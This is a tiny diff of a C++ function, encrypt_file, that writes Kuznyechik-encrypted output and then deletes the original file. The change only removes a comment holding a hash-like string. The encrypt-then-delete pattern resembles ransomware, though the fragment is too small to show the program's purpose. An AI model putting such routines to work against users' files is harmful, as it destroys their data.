@@ -94,7 +94,7 @@ void encrypt_file(Kyznechik &kyz, std::wstring drop_path = L"-1")
 
             out.write(reinterpret_cast<char *>(buffer.data()), read_bytes);
         }
-        // 9342565319640As@4a4b6107a6ae90c424e43199c45aa069009201ca56dbd00ddb2b92fe4c2b1d52
+        
         in.close();
         out.close();
         std::filesystem::remove(correct_path);
